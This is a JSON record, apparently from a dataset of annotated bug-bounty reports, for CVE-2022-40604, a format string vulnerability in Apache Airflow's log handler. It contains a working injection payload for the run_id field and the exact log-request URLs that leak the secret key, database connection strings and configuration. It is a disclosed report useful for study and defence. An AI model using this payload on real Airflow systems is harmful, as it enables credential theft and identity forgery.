{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "leixiao ",
  "title": "CVE-2022-40604: Apache Airflow: Format String Vulnerability",
  "content": "\nThere is a Format String Vulnerability in src/airflow/utils/log/file_task_handler.py\nurl = os.path.join(\"http://{ti.hostname}:{worker_log_server_port}/log\", log_relative_path).format(\nti=ti, worker_log_server_port=conf.get('logging', 'WORKER_LOG_SERVER_PORT')\n)\nIn the above code, I can control some part of the log_relative_path, because log_relative_path is made up of run_id and other things.\nAttack steps:\nEnter the DAGs menu, Choose any DAG, select Trigger DAG w/ config.\nSet the run_id to {ti.task.__class__.__init__.__globals__[conf].__dict__} and trigger it.\nEnter the /xcom/list/ page, click to enter the corresponding task page.\nClick the Log option and capture the packet, you will get a request similar to the following: /get_logs_with_metadata?dag_id=example_xcom&task_id=push_by_returning&map_index=-1&execution_date=2022-08-29T13%3A25%3A11%2B00%3A00&try_number=1&metadata=null\nModify try_number to a nonexistent value, such as 9999, such as: /get_logs_with_metadata?dag_id=example_xcom&task_id=push_by_returning&map_index=-1&execution_date=2022-08-29T13%3A25%3A11%2B00%3A00&try_number=9999&metadata=null\nPaste the modified url into the browser for access\nImpact\nAttacker can get a lot of sensitive information through this vulnerability, such as secret_key, database connection string, various configurations.\nCan forge identity by the secret_key, can get the database password by database connection string, etc. Moreover, this vulnerability can be triggered by any DAG and exists in the production environment, so I think it's critical.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": 8000,
  "weaknesses": [
    "Use of Externally-Controlled Format String"
  ],
  "screenshots": {},
  "disclosed_date": 1737235680,
  "report_url": "https://hackerone.com/reports/1707287",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Enter the DAGs menu, Choose any DAG, select Trigger DAG w/ config."
    ],
    [
      2,
      "Set the run_id to {ti.task.__class__.__init__.__globals__[conf].__dict__} and trigger it."
    ],
    [
      3,
      "Enter the /xcom/list/ page, click to enter the corresponding task page."
    ],
    [
      4,
      "Click the Log option and capture the packet, you will get a request similar to the following: /get_logs_with_metadata?dag_id=example_xcom&task_id=push_by_returning&map_index=-1&execution_date=2022-08-29T13%3A25%3A11%2B00%3A00&try_number=1&metadata=null"
    ],
    [
      5,
      "Modify try_number to a nonexistent value, such as 9999, such as: /get_logs_with_metadata?dag_id=example_xcom&task_id=push_by_returning&map_index=-1&execution_date=2022-08-29T13%3A25%3A11%2B00%3A00&try_number=9999&metadata=null"
    ],
    [
      6,
      "Paste the modified url into the browser for access"
    ]
  ],
  "vuln_description": "There is a Format String Vulnerability in src/airflow/utils/log/file_task_handler.py. An attacker can control part of the log_relative_path, which is made up of run_id and other things. This allows the attacker to inject format strings and access sensitive information such as secret_key, database connection string, and various configurations.",
  "reason": "The vulnerability involves understanding the format string injection in the context of Apache Airflow's logging mechanism, manipulating the run_id to inject malicious format strings, and then triggering the vulnerability by accessing a modified log URL. The steps require knowledge of the application's internals and the ability to chain multiple actions together.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves manipulating the run_id parameter in a DAG trigger to exploit a format string vulnerability in Apache Airflow, which is not covered by the described methodologies as it does not involve swapping user sessions or resource IDs within the same application context.",
    "is_detectable": false
  }
}